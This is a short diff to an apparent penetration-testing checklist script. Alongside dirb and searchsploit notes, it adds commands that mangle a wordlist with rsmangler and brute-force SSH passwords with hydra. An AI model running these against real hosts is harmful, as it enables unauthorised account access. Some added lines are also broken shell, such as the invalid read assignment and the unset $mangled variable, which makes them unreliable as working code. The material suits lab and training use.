@@ -22,4 +22,10 @@ dirb http://$ipadd -wfr
 
 # take versions of apps from nmap and dump into metasploit search/searchsploit, then test exploits with check function
 
-#
+# do you have a username? 
+$username = read -p "What is the username?"
+# password cracking - do you have a wordlist? is it mangled?
+rsmangler -m 9 -x 12 -drp -f $wordlist -o mangled.txt
+
+# what service are you trying to crack the password of? 
+hydra -l $username -P $mangled $ipadd -t 4 ssh
